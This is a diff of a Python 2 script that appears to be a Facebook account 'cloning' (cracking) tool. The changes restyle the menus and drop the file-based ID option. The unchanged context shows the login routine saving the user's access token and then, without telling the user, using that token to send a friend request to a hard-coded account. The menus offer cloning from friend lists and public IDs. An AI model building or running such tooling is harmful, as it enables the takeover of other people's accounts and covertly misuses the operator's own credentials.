@@ -151,7 +151,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;92mLogin Successful'
+				print '\n\x1b[1;92mLogin Successful...'
 				os.system('xdg-open https://www.Facebook.com/Omi6t')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -196,12 +196,13 @@ def menu():
 		keluar()
 	os.system("clear")
 	print logo
+	print('	   \033[1;96m【\x1b[1;96mLogged in User Info\x1b[1;96m】' )
 	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-	print "\033[1;96m👤\033[1;93m Name\033[1;93m: \033[1;92m"+nama+"\033[1;97m               "
-	print "\033[1;96m👤\033[1;93m ID\033[1;93m: \033[1;92m"+id+"\x1b[1;97m              "
+	print "	  \033[1;93m Name\033[1;93m: \033[1;92m"+nama+"\033[1;97m               "
+	print "	  \033[1;93m ID\033[1;93m: \033[1;92m"+id+"\x1b[1;97m              "
 	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start Cloning..."
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
+	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
+	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
 	pilih()
 
 
@@ -234,10 +235,9 @@ def super():
 	os.system('clear')
 	print logo
 	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Clone From Friend List..."
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Clone From Public ID..."
-	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Clone From File..."
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
+	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mClone From Friend List..."
+	print "\033[1;97m--\033[1;92m> \033[1;92m2.\x1b[1;92mClone From Public ID..."
+	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_super()
 
 def pilih_super():
@@ -272,18 +272,6 @@ def pilih_super():
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
-	elif peak =="3":
-		os.system('clear')
-		print logo
-		print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-		try:
-			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
-			for line in open(idlist,'r').readlines():
-				id.append(line.strip())
-		except IOError:
-			print '\x1b[1;91m✘\x1b[1;91mFile Not Found'
-			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
-			super()
 	elif peak =="0":
 		menu()
 	else:
